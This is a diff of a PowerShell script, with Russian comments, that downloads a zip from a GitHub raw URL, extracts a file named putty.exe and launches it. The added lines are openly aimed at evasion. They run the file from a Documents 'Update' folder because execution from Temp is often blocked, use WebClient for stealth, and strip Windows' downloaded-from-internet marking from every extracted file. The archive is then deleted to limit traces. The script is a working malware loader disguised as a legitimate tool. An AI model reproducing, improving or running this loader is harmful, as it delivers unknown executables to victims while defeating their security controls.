@@ -1,21 +1,29 @@
-# Указываем прямые пути
 $url = "https://github.com/mahmed9203/under888/raw/refs/heads/main/222.zip"
-$temp = $env:TEMP
-$zip = "$temp\222.zip"
-$dir = "$temp\ex"
+# Используем папку Documents, так как из Temp часто запрещен запуск политиками
+$dir = "$env:USERPROFILE\Documents\Update"
+$zip = "$dir\222.zip"
 $exe = "$dir\putty.exe"
 
-# 1. Скачивание архива
-Invoke-WebRequest -Uri $url -OutFile $zip
-
-# 2. Распаковка (создаем папку, если её нет)
+# Создаем папку, если ее нет
 if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
+
+# Скачивание через WebClient (более скрытно, чем iwr)
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $zip)
+
+# Снимаем блокировку "скачано из интернета" с архива
+Unblock-File -Path $zip
+
+# Распаковка
 Expand-Archive -Path $zip -DestinationPath $dir -Force
 
-# 3. Запуск и очистка
+# Снимаем блокировку со всех извлеченных файлов (включая exe)
+Get-ChildItem -Path $dir -Recurse | Unblock-File
+
+# Запуск
 if (Test-Path $exe) {
-    Start-Process -FilePath $exe
+    Start-Process -FilePath $exe -WorkingDirectory $dir
 }
 
-# Удаляем архив после запуска, чтобы не оставлять следов
+# Очистка архива
 Remove-Item -Path $zip -Force
